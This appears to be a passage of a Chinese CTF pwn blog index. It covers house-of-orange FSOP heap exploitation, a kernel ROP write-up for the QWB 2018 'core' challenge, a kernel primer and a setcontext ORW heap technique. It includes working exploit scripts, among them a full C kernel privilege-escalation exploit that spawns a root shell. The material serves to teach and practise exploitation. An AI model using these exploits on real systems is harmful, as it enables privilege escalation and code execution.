这个方法利用的就是当topchunk的size不足够申请的时候，malloc函数会重新申请一块区域作为topchunk，并且把当前的topchunk free掉到unsorted bin，所以我们就可以尝试修改topchunk的size，修改到不足够的大小，然后再申请一次比修改的topchunk的size要大的size\n但是free的topchunk的size有一些要求（很多地方对这个介绍的很复杂，所以我想简单的来说）\n\n不要太小，比如小于0x10(MINSIZE)就不行了\ntopchunk的结束地址（当前地址 + size）要与页基址对齐，一般就是0x1000（结尾三个0）\nprev_inuse &#x3D; 1\n\n所以，当我们再次申请大于topchunk size的时候，就会进入unsorted bin，我们就可以leak libc了，并且可以同时泄露出堆地址\n第二步是利用_IO_flush_all_lockp进行攻击 这个函数我在ByteCTF 2019 note_five的那道题中也用到过，到了这里终于可以好好解释一下了。\n什么时候会触发这个函数？ 当系统发生abort的时候，会利用_IO_flush_all_lockp来看看各个fp指针中还有没有数据没有输出的，如果有，那么就会调用_IO_OVERFLOW。 _IO_OVERFLOW这个函数是调用当前fp指针的vtable中的+0x18地址。\n这个函数做了什么？ 通过_IO_all_list获取到头指针，然后用fp-&gt;_chain来寻找下一个指针，直到0的时候停止。 所以，如果我们可以控制_IO_list_all，并且达成他要求的一些条件，那么我们就可以通过伪造vtable的_IO_OVERFLOW位置（+0x18）的方式来getshell。 不过在libc2.24以上就已经加入了对vtable范围的检测，所以在这里我们的测试环境都是在libc2.23下（ubuntu 16.04）。\n具体如何构造和利用？ 由于我们现在没有权限直接对_IO_all_list进行写入地址（废话，如果可以直接写入，那么就直接打__malloc_hook不香吗） 但是我们可以用unsorted bin attack在_IO_all_list上写一个main_arena + 88的地址，然后在_IO_flush_all_lockp函数中就会认为这个地址是一个fp指针，并且判定这个指针的条件是否成立，如果成立的话执行_IO_OVERFLOW，当然由于main_arena的内容很难控制，所以我们无法直接修改这上面的内容进行getshell。\n所以我们要考虑条件不成立的情况，也就是程序没有再次发生异常（因为上诉中vtable的值不受控，如果vtable的值不正确，就可能会发生异常），程序就会到fp-&gt;_chain继续查找下一个指针。调试可以发现fp-&gt;_chain正好就是smallbin[4]的位置，对应的存放的smallbin size为0x60，所以我们如果可以修改这个位置为一个可控的地址，那么就可以成功伪造一个下一个fp指针达到getshell的目的。\n怎么样才能写入堆地址到smallbin[4]呢？ 当你malloc的时候，程序会去看unsorted bin有没有符合的size，这个时候会把unsorted bin拿出来检测，如果大小不合适的话，这时候会先放到small bin中去。 所以如果我们构造一个size为0x60的unsorted bin，然后再free它，那么就可以成功的让他进入smallbin，在那里写入的地址就是这个堆的地址，而这个堆内容被我们提前布置好，就可以成功getshell了。\n堆上需要布置哪些东西呢？ 我们需要布置的内容有：\n      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T\t   || (_IO_vtable_offset (fp) == 0\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif\t   )\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\tresult = EOF;\n\n我们知道if是从左到右依次执行的，如果前面的不符合后面的也不会执行，所以我们可以构造下面两者中任意一个。 1.(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 2.(_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)\n把vtable的值写入一个可控的位置，并且修改vtable+0x18的位置为想要执行的函数\n最后来说说这个流程： 构造后当程序调用到这个位置的fp（前提是前一块没有报错，概率是1&#x2F;2，因为在main_arena上的fp-&gt;_mode的值是不可控的）。 并且判定条件成立，就会去vtable表中执行_IO_OVERFLOW，执行了我们修改的函数。 顺带一提的是，当执行_IO_OVERFLOW的时候，传入的第一个参数就是，这个fp的地址，所以说，如果我们可以修改这个伪造fp的头部位置为&#x2F;bin&#x2F;sh，并且伪造vtable中IO_overflow位置为system，那么就可以成功getshell了。 所以我们可以修改我们的可控位置，也就是fp的地址为想要执行的内容，但是一般来说直接修改头部位置，也就是_flags的位置是不太好的，不过由于这里根本没有用到_flags，所以我们可以直接修改。 如果不可以修改_flags的情况，那么就在他后面写一个;sh;，这样的话由于;的隔开，前面后面的语句都会认为是错误的，所以也成功执行了sh。\n我们有一个方法可以同时完成以上步骤，就是一次性写好所有的构造数据在堆上，这时候malloc一次和原来的数据大小不一样的size。 这时候的执行步骤的这样的。 1.执行unsorted bin attack，修改BK-&gt;fd = main_arena + 88 2.malloc chunk发现unsorted bin中的size和要申请的size大小不匹配，所以把unsorted bin中的数据放到了smallbin中，具体是哪块位置呢？这时候就要看size了，这里构造的size是0x60，所以就会进入到smallbin[4]中，这里对应的内容就是fp-&gt;_chain。 3.由于链表被破坏了，所以在之后的检测发生了报错，这个报错就会调用到_IO_flush_all_lockp，而这里就会对_IO_list_all进行遍历，由于1中修改了_IO_list_all为main_arena + 88，这时候就会去看对应数据符不符合要求。 如果这里符合要求，那么就会调用这里vtable的IO_overflow，由于这里的数据我们没有构造过，所以就会发生又一次异常，getshell失败了（1&#x2F;2）。 如果这里不符合要求，就会去看这里的fp-&gt;_chain的位置，正好是我们伪造的smallbin[4]的地方，这时候fp指针指向我们伪造的堆块，堆块的对应内容符合要求，就会去我们伪造的可控的vtable执行_IO_OVERFLOW，而这里被我们伪造成system，并且我们修改这个fp的头部位置为/bin/sh，所以当调用的时候就会把这个作为参数去调用，最后就是执行了system(&quot;/bin/sh&quot;)，也就成功getshell了。\n例题：题目是自己出的，等什么时候那边使用了再放出来吧\nexp:\nadd(0,0x30)edit(0,0x40,b&#x27;A&#x27;*0x30+p64(0)+p64(0xfc1))add(1,0x1000)add(2,0x400)show(2)libcbase=uu64()-0x3c5188lg(&quot;libcbase&quot;)io_list_all=libcbase+libc.sym[&#x27;_IO_list_all&#x27;]system=libcbase+libc.sym[&#x27;system&#x27;]fd=libcbase+0x3c4b78edit(2,0x10,b&#x27;A&#x27;*0xf+b&#x27;B&#x27;)show(2)ru(b&#x27;B&#x27;)heapbase=u64(io.recvuntil(b&#x27;\\n&#x27;,drop=True).ljust(8,b&#x27;\\x00&#x27;))-0x40lg(&quot;heapbase&quot;)vtable=heapbase+0x450payload = b&#x27;a&#x27; * 0x400fake_file = b&#x27;/bin/sh\\x00&#x27; + p64(0x61)fake_file += p64(system) + p64(io_list_all - 0x10)fake_file += p64(0) + p64(1)fake_file = fake_file.ljust(0xc0,b&#x27;\\x00&#x27;)fake_file += p64(0) * 3fake_file += p64(vtable+0xf0-0x18)fake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(2,len(payload),payload)add(3,0x10)ia()\n\n"},{"title":"kernel_rop","url":"/2024/03/04/kernel-rop/","content":"参考文章:https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/rop/#_4\n内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由 system(&quot;/bin/sh&quot;) 变为了 commit_creds(&amp;init_cred) 或 commit_creds(prepare_kernel_cred(NULL))，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。\n状态保存通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要着陆回用户态以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要手动模拟用户态进入内核态的准备工作——保存各寄存器的值到内核栈上，以便于后续着陆回用户态。\n通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链\n一个通用的pwn板子\n编译时需要指定参数：-masm=intel\nsize_t user_cs, user_ss, user_rflags, user_sp;void saveStatus()&#123;    __asm__(&quot;mov user_cs, cs;&quot;            &quot;mov user_ss, ss;&quot;            &quot;mov user_sp, rsp;&quot;            &quot;pushf;&quot;            &quot;pop user_rflags;&quot;            );    puts(&quot;\\033[34m\\033[1m[*] Status has been saved.\\033[0m&quot;);&#125;\n\n返回用户态由内核态返回用户态只需要：\n\nswapgs指令恢复用户态 GS 寄存器\nsysretq或者iretq恢复到用户空间\n\n那么我们只需要在内核中找到相应的 gadget 并执行swapgs;iretq就可以成功着陆回用户态。\n通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：\nswapgsiretquser_shell_addruser_csuser_eflags //64bit user_rflagsuser_spuser_ss\n\n例题：强网杯 2018 - core分析题目给了 bzImage，core.cpio，start.sh 以及带符号表的 vmlinux 四个文件\n前三个文件我们已经知道了作用，vmlinux 则是静态编译，未经过压缩的 kernel 文件，相对应的 bzImage 可以理解为压缩后的文件，更详细的可以看 stackexchange\nvmlinux 未经过压缩，也就是说我们可以从 vmlinux 中找到一些 gadget，我们先把 gadget 保存下来备用。 \n这里建议使用ropper来查找可能会比较方便，或者使用ROPgadget将所有gadget导入一个文本文档\n 看一下 start.sh  \nqemu-system-x86_64 \\-m 64M \\-kernel ./bzImage \\-initrd  ./core.cpio \\-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \\-s  \\-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\-nographic  \\\n\n发现内核开启了 kaslr 保护。\n解压 core.cpio 后，看一下 init (这里我的脚本已经修改过了)\n#!/bin/shmount -t proc proc /procmount -t sysfs sysfs /sysmount -t devtmpfs none /dev/sbin/mdev -smkdir -p /dev/ptsmount -vt devpts -o gid=4,mode=620 none /dev/ptschmod 666 /dev/ptmxcat /proc/kallsyms &gt; /tmp/kallsymsecho 1 &gt; /proc/sys/kernel/kptr_restrictecho 1 &gt; /proc/sys/kernel/dmesg_restrictifconfig eth0 upudhcpc -i eth0ifconfig eth0 10.0.2.15 netmask 255.255.255.0route add default gw 10.0.2.2 insmod /core.ko#poweroff -d 120 -f &amp;#setsid /bin/cttyhack setuidgid 1000 /bin/shsetsid /bin/cttyhack setuidgid 0 /bin/shecho &#x27;sh end!\\n&#x27;umount /procumount /sys\n\n\n第 9 行中把 kallsyms 的内容保存到了 &#x2F;tmp&#x2F;kallsyms 中，那么我们就能从 &#x2F;tmp&#x2F;kallsyms 中读取 commit_creds，prepare_kernel_cred 的函数的地址了\n第 10 行把 kptr_restrict 设为 1，这样就不能通过 &#x2F;proc&#x2F;kallsyms 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了\n第 11 行把 dmesg_restrict 设为 1，这样就不能通过 dmesg 查看 kernel 的信息了\n第 18 行设置了定时关机，为了避免做题时产生干扰，直接把这句删掉然后重新打包\n\n同时还发现了一个 shell 脚本 gen_cpio.sh，主要是方便打包的脚本\n这里运行kernel需要将start.sh内的64改为128，需要将分配给内核的内存调大，因为这里我很多都已经改过了就直接放wiki的操作了\ncore [master●●] vim init core [master●●] rm core.cpio core [master●●] ./gen_cpio.sh core.cpio../usr./usr/sbin./usr/sbin/popmaildir............./core.cpio./core.ko129851 块core [master●●] lsbin        core.ko  gen_cpio.sh  lib    linuxrc  root  sys  usrcore.cpio  etc      init         lib64  proc     sbin  tmp  vmlinuxcore [master●●] mv core.cpio ..core [master●●] cd ..give_to_player [master●●] ./start.sh \n\n接着分析core.ko\n\n用ida查看，发现在core_copy_func中存在明显的栈溢出\n__int64 __fastcall core_copy_func(__int64 a1)&#123;  __int64 result; // rax  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF  v2[8] = __readgsqword(0x28u);  printk(&amp;unk_215);  if ( a1 &gt; 63 )  &#123;    printk(&amp;unk_2A1);    return 0xFFFFFFFFLL;  &#125;  else  &#123;    result = 0LL;    qmemcpy(v2, &amp;name, (unsigned __int16)a1);  &#125;  return result;&#125;\n\n其他函数功能分析可以在wiki中查看，wiki讲的很清楚\n思路：\n\n通过 ioctl 设置 off，然后通过 core_read() leak 出 canary\n通过 core_write() 向 name 写，构造 ropchain\n通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop\n通过 rop 执行 commit_creds(prepare_kernel_cred(0))\n返回用户态，通过 system(“&#x2F;bin&#x2F;sh”) 等起 shell\n\nexp：\n// gcc exp.c -static -masm=intel -g -o exp#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;void spawn_shell()&#123;    system(&quot;/bin/sh&quot;);&#125;size_t commit_creds = 0, prepare_kernel_cred = 0;size_t raw_vmlinux_base = 0xffffffff81000000;size_t vmlinux_base = 0;size_t find_symbols()&#123;    FILE* kallsyms_fd = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if(kallsyms_fd &lt; 0)    &#123;        puts(&quot;[*]open kallsyms error!&quot;);        exit(0);    &#125;    char buf[0x30] = &#123;0&#125;;    while(fgets(buf, 0x30, kallsyms_fd))    &#123;        if(commit_creds &amp; prepare_kernel_cred)            return 0;        printf(&quot;%s&quot;,buf);        if(strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds)        &#123;            /* puts(buf); */            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds addr: %p\\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base addr: %p\\n&quot;, vmlinux_base);        &#125;        if(strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred addr: %p\\n&quot;, prepare_kernel_cred);        &#125;    &#125;    if(!(prepare_kernel_cred &amp; commit_creds))    &#123;        puts(&quot;[*]Error!&quot;);        exit(0);    &#125;&#125;size_t user_cs, user_ss, user_rflags, user_sp;void save_status()&#123;    __asm__(&quot;mov user_cs, cs;&quot;            &quot;mov user_ss, ss;&quot;            &quot;mov user_sp, rsp;&quot;            &quot;pushf;&quot;            &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved&quot;);&#125;void set_off(int fd, long long idx)&#123;    printf(&quot;[*]set off9 to %ld\\n&quot;, idx);    ioctl(fd, 0x6677889C, idx);&#125;void core_read(int fd, char *buf)&#123;    puts(&quot;[*]read to buf.&quot;);    ioctl(fd, 0x6677889B, buf);&#125;void core_copy_func(int fd, long long size)&#123;    printf(&quot;[*]copy from user with size: %ld\\n&quot;, size);    ioctl(fd, 0x6677889A, size);&#125;int main()&#123;    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if (fd &lt; 0)     &#123;        puts(&quot;[*]open /proc/core error!&quot;);        exit(0);    &#125;    find_symbols();    ssize_t offset = vmlinux_base - raw_vmlinux_base;    set_off(fd, 0x40);    char buf[0x40] = &#123;0&#125;;    core_read(fd, buf);    size_t canary = ((size_t *)buf)[0];    printf(&quot;[+]canary: %p\\n&quot;, canary);    size_t rop[0x1000] = &#123;0&#125;;    int i;    for(i = 0; i &lt; 10; i++)    &#123;        rop[i] = canary;    &#125;    rop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret    rop[i++] = 0;    rop[i++] = prepare_kernel_cred;         // prepare_kernel_cred(0)    rop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret    rop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret    rop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;     rop[i++] = commit_creds;    rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret    rop[i++] = 0;    rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;     rop[i++] = (size_t)spawn_shell; // rip    rop[i++] = user_cs;    rop[i++] = user_rflags;    rop[i++] = user_sp;    rop[i++] = user_ss;    write(fd, rop, 0x800);    core_copy_func(fd, 0xffffffffffff0000 | (0x100));    return 0;&#125;\n\n"},{"title":"kernel初探","url":"/2023/09/25/kernel%E5%88%9D%E6%8E%A2/","content":"kernelkernel 也是一个程序，用来管理软件发出的数据 I&#x2F;O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel 是现代操作系统最基本的部分。kernel 最主要的功能有两点：\n\n控制并与硬件进行交互\n提供 application 能运行的环境\n\n包括 I&#x2F;O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。需要注意的是，kernel 的 crash 通常会引起重启。\n在pwn中的内核题通常都是提权？通过执行commit_creds(&amp;init_cred)或commit_creds(prepare_kernel_cred(NULL)) 并且最后返回用户态的shell，就取得了root权限。\nRing Modelintel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。大多数的现代操作系统只使用了 Ring 0 和 Ring 3。\nLoadable Kernel Modules(LKMs)可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:\n\n驱动程序（Device drivers）\n设备驱动\n文件系统驱动\n…\n\n\n内核扩展模块 (modules)\n\nLKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe&#x2F;dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。\n在pwn中的kernel题，通常漏洞位于驱动文件即一个xxx.ko文件，这个可以在文件系统中的init文件中详细分析漏洞文件是哪个，以及更改init文件来使自己在qemu模拟时获得root权限来方便后续调试\n相关指令\ninsmod: 讲指定模块加载到内核中\nrmmod: 从内核中卸载指定模块\nlsmod: 列出已经加载的模块\nmodprobe: 添加或删除模块，modprobe 在加载模块时会查找依赖关系\n\nsyscall系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。\nioctl直接查看 man 手册\nNAME       ioctl - control deviceSYNOPSIS       #include &lt;sys/ioctl.h&gt;       int ioctl(int fd, unsigned long request, ...);DESCRIPTION       The ioctl() system call manipulates the underlying device parameters of special       files.  In particular, many  operating  characteristics  of  character  special       files  (e.g., terminals) may be controlled with ioctl() requests.  The argument       fd must be an open file descriptor.       The second argument is a device-dependent request code.  The third argument  is       an  untyped  pointer  to  memory.  It&#x27;s traditionally char *argp (from the days       before void * was valid C), and will be so named for this discussion.       An ioctl() request has encoded in it whether the argument is an in parameter or       out  parameter, and the size of the argument argp in bytes.  Macros and defines       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.\n\n可以看出 ioctl 也是一个系统调用，用于与设备通信。int ioctl(int fd, unsigned long request, …) 的第一个参数为打开设备 (open) 返回的 文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。\n状态切换user space to kernel space当发生 系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体的过程为：\n\n通过 swapgs 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。\n将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp&#x2F;esp。\n通过 push 保存各寄存器值，具体的 代码 如下:\n\nENTRY(entry_SYSCALL_64) /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */ SWAPGS_UNSAFE_STACK /* 保存栈值，并设置内核栈 */ movq %rsp, PER_CPU_VAR(rsp_scratch) movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp/* 通过push保存寄存器值，形成一个pt_regs结构 *//* Construct struct pt_regs on stack */pushq  $__USER_DS      /* pt_regs-&gt;ss */pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */pushq  %r11             /* pt_regs-&gt;flags */pushq  $__USER_CS      /* pt_regs-&gt;cs */pushq  %rcx             /* pt_regs-&gt;ip */pushq  %rax             /* pt_regs-&gt;orig_ax */pushq  %rdi             /* pt_regs-&gt;di */pushq  %rsi             /* pt_regs-&gt;si */pushq  %rdx             /* pt_regs-&gt;dx */pushq  %rcx tuichu    /* pt_regs-&gt;cx */pushq  $-ENOSYS        /* pt_regs-&gt;ax */pushq  %r8              /* pt_regs-&gt;r8 */pushq  %r9              /* pt_regs-&gt;r9 */pushq  %r10             /* pt_regs-&gt;r10 */pushq  %r11             /* pt_regs-&gt;r11 */sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */\n\n\n通过汇编指令判断是否为 x32_abi。\n通过系统调用号，跳到全局变量 sys_call_table 相应位置继续执行系统调用。\n\nkernel space to user space退出时，流程如下：\n\n通过 swapgs 恢复 GS 值\n通过 sysretq 或者 iretq 恢复到用户控件继续执行。如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags&#x2F;rflags, esp&#x2F;rsp 等）\n\nstruct cred之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。源码 如下:\nstruct cred &#123;    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC  0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif    kuid_t      uid;        /* real UID of the task */    kgid_t      gid;        /* real GID of the task */    kuid_t      suid;       /* saved UID of the task */    kgid_t      sgid;       /* saved GID of the task */    kuid_t      euid;       /* effective UID of the task */    kgid_t      egid;       /* effective GID of the task */    kuid_t      fsuid;      /* UID for VFS ops */    kgid_t      fsgid;      /* GID for VFS ops */    unsigned    securebits; /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;  /* caps we&#x27;re permitted */    kernel_cap_t    cap_effective;  /* caps we can actually use */    kernel_cap_t    cap_bset;   /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char   jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key  *process_keyring; /* keyring private to this process */    struct key  *thread_keyring; /* keyring private to this thread */    struct key  *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;  /* subjective LSM security */#endif    struct user_struct *user;   /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;  /* supplementary groups for euid/fsgid */    struct rcu_head rcu;        /* RCU deletion hook */&#125; __randomize_layout;\n\n内核态函数相比用户态库函数，内核态的函数有了一些变化\n\nprintf() -&gt; **printk()**，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 dmesg 查看效果\nmemcpy() -&gt; copy_from_user()&#x2F;copy_to_user()\ncopy_from_user() 实现了将用户空间的数据传送到内核空间\ncopy_to_user() 实现了将内核空间的数据传送到用户空间\n\n\nmalloc() -&gt; **kmalloc()**，内核态的内存分配函数，和 malloc() 相似，但使用的是 slab&#x2F;slub 分配器\nfree() -&gt; **kfree()**，同 kmalloc()\n\n另外要注意的是，kernel 管理进程，因此 kernel 也记录了进程的权限。kernel 中有两个可以方便的改变权限的函数：\n\n*int commit_creds(struct cred new)\nstruct cred prepare_kernel_cred(struct task_struct daemon)**\n\n从函数名也可以看出，执行 commit_creds(prepare_kernel_cred(0)) 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。更多关于 prepare_kernel_cred 的信息可以参考 源码执行 commit_creds(prepare_kernel_cred(0)) 也是最常用的提权手段，两个函数的地址都可以在 &#x2F;proc&#x2F;kallsyms 中查看（较老的内核版本中是 &#x2F;proc&#x2F;ksyms）。\npost sudo grep commit_creds /proc/kallsyms[sudo] m4x 的密码：ffffffffbb6af9e0 T commit_credsffffffffbc7cb3d0 r __ksymtab_commit_credsffffffffbc7f06fe r __kstrtab_commit_credspost sudo grep prepare_kernel_cred /proc/kallsymsffffffffbb6afd90 T prepare_kernel_credffffffffbc7d4f20 r __ksymtab_prepare_kernel_credffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred\n\n一般情况下，&#x2F;proc&#x2F;kallsyms 的内容需要 root 权限才能查看所以在更改init文件时，需要更改权限为root以便调试获取基址等内容\nCTF kernel pwn 相关一般会给以下三个文件\n\nboot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关\nbzImage: kernel binary\nrootfs.cpio: 文件系统映像\n\n比如：\nyoulin@youlin-virtual-machine:~/kernel/qwb2018-core/give_to_player$ lsbzImage  core  core.cpio  core.ko  exp  exp.c  g1  g2  start.sh  vmlinuxyoulin@youlin-virtual-machine:~/kernel/qwb2018-core/give_to_player$ file vmlinuxvmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=1d8344e71a82bc43821029796ef65bebfe8e65c3, not strippedyoulin@youlin-virtual-machine:~/kernel/qwb2018-core/give_to_player$ file bzImagebzImage: Linux kernel x86 boot executable bzImage, version 4.15.8 (simple@vps-simple) #19 SMP Mon Mar 19 18:50:28 CST 2018, RO-rootFS, swap_dev 0X6, Normal VGAyoulin@youlin-virtual-machine:~/kernel/qwb2018-core/give_to_player$ cat start.shqemu-system-x86_64 \\-m 128M \\-kernel ./bzImage \\-initrd  ./core.cpio \\-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \\-s  \\-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\-nographic  \\\n\n\n解释一下 qemu 启动的参数：\ninitrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统\nkernel .&#x2F;bzImage，使用 bzImage 作为 kernel 映像\ncpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep\nm 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 –help 查看。\n\n\n本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。（这里注意kernel的exp不再是拿python写了，而是c语言编写exp）\n\n"},{"title":"orw_heap","url":"/2023/10/24/orw-heap/","content":"又是查缺补漏的一篇文章，由于之前学堆在学习完了一些基础的知识之后直接去看house of banana了，这里不得不感慨banana的强大，其实很多堆题都是可以利用banana的利用链去做的(包括orw)所以就没有仔细的学习setcontext的利用手法，只是大概知道有这么个东西。但是培训的时候客户有问这个也就仔细去学习了一下(感谢on3师傅的帮助)\nsetcontext介绍主要是利用setcontext+53的这段gadget，通过控制rsp来控制程序的返回地址，即通过控制rdi+0xa0处的地址来控制rsp\n\n2.27利用方法将free_hook修改为setcontext，并在堆块上布置orw链，以及堆块地址+0xa0处写上orw的地址,+0xa8处写上ret的地址，即可执行orw\n例题链接：https://pan.baidu.com/s/1Pnl09FAe6OofcRl5GicoOA?pwd=p87w \n简单的分析一下题目，可以看到题目开了沙箱\n\n\n并且程序本身有uaf\n\n因此确定利用思路为先泄露libc然后将free_hook修改为setcontext并在堆块上布置好orw链\n先泄露libc并计算出需要用到的一些gadget\nadd(0x410,b&#x27;AAAA&#x27;)#0add(0x10,b&#x27;AAAA&#x27;)#1delete(0)show(0)libcbase=uu64()-0x3ebca0lg(&quot;libcbase&quot;)malloc_hook=libcbase+libc.sym[&#x27;__malloc_hook&#x27;]free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;]setcontext=libcbase+libc.sym[&#x27;setcontext&#x27;]+53pop_rdi=0x000000000002164f+libcbasepop_rsi=0x0000000000023a6a+libcbasepop_rdx=0x0000000000001b96+libcbaseret=libcbase+0x00000000000008aaopen=libcbase+libc.sym[&#x27;open&#x27;]read=libcbase+libc.sym[&#x27;read&#x27;]write=libcbase+libc.sym[&#x27;write&#x27;]\n\n泄露堆地址并修改free_hook为setcontext\nadd(0x410,b&#x27;AAAA&#x27;)#2add(0x60,b&#x27;AAAA&#x27;)#3add(0x70,b&#x27;AAAA&#x27;)#4add(0x70,b&#x27;AAAA&#x27;)#5delete(3)delete(4)delete(5)show(5)heapbase=uheap()-0x710lg(&quot;heapbase&quot;)edit(3,p64(free_hook))add(0x60,b&#x27;AAAA&#x27;)#6add(0x60,p64(setcontext))#7\n\n布置orw链，并通过free对应的堆块使得rdi指向堆上的地址从而控制程序执行orw\nheap=heapbase+0x260flag_addr=heap+0x300orw_addr=heap+0xb0orw=p64(pop_rdi)+p64(heap)+p64(pop_rsi)+p64(0)+p64(open)orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x50)+p64(read)orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x50)+p64(write)payload=b&#x27;./flag\\x00&#x27;.ljust(0xa0,b&#x27;\\x00&#x27;)payload+=p64(orw_addr)+p64(ret)+orwedit(2,payload)delete(2)ia()\n\n